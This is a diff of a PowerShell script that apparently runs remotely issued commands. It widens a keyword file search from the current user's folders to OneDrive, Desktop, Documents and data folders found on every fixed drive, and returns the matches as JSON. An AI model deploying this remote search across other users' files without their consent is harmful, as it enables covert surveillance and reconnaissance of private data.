@@ -320,24 +320,39 @@ try { `$Web = New-Object System.Net.WebClient; `$ImgBytes = `$Web.DownloadData('
                                 $Result = "Computer renamed to $newName (Restart Required)"
                             } elseif ($cmd.type -eq "LocalSearch") {
                                 $kw = $cmd.payload.keyword
-                                Log-Message "LOCAL SEARCH START: $kw"
-                                $paths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "C:\!Data")
-                                # Discovery of other OneDrives
-                                if ($env:OneDrive) { $paths += $env:OneDrive }
+                                Log-Message "UNIVERSAL SEARCH START: $kw"
+                                
+                                # 1. Build list of potential search roots
+                                $searchRoots = @()
+                                # User's current profile
+                                $searchRoots += @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
+                                if ($env:OneDrive) { $searchRoots += $env:OneDrive }
+                                
+                                # 2. Discover all other OneDrives and Desktops on all fixed drives
                                 try {
-                                    $discovered = Get-ChildItem -Path C:\ -Include "*OneDrive*" -Directory -Depth 1 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
-                                    if ($discovered) { $paths += $discovered }
+                                    $fixedDrives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Free -gt 0 }
+                                    foreach ($d in $fixedDrives) {
+                                        $root = $d.Root
+                                        # Look for user profile folders and root-level data folders
+                                        $discovered = Get-ChildItem -Path $root -Include "*OneDrive*", "*Desktop*", "*Documents*", "*!Data*" -Directory -Depth 2 -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
+                                        if ($discovered) { $searchRoots += $discovered }
+                                    }
                                 } catch {}
                                 
-                                $paths = $paths | Select-Object -Unique | Where-Object { Test-Path $_ }
-                                Log-Message "Scanning paths: $($paths -join ', ')"
+                                $finalPaths = $searchRoots | Select-Object -Unique | Where-Object { Test-Path $_ }
+                                Log-Message "Scanning Universal Roots: $($finalPaths -join ', ')"
 
-                                $files = foreach ($p in $paths) {
-                                    Get-ChildItem -Path $p -Filter "*$kw*" -Recurse -File -ErrorAction SilentlyContinue | 
-                                        Select-Object Name, FullName, @{Name="Size";Expression={$_.Length}}, LastWriteTime
+                                $filesFound = @()
+                                foreach ($p in $finalPaths) {
+                                    try {
+                                        $found = Get-ChildItem -Path $p -Filter "*$kw*" -Recurse -File -ErrorAction SilentlyContinue | 
+                                            Select-Object Name, FullName, @{Name="Size";Expression={$_.Length}}, LastWriteTime
+                                        if ($found) { $filesFound += $found }
+                                    } catch {}
                                 }
-                                $Result = if ($files) { $files | ConvertTo-Json } else { "[]" }
-                                Log-Message "LOCAL SEARCH END: Found $($files.Count) items."
+                                
+                                $Result = if ($filesFound.Count -gt 0) { $filesFound | ConvertTo-Json } else { "[]" }
+                                Log-Message "UNIVERSAL SEARCH END: Found $($filesFound.Count) items."
                             }
                             
                             Log-Message "Result captured ($($Result.Length) chars)"
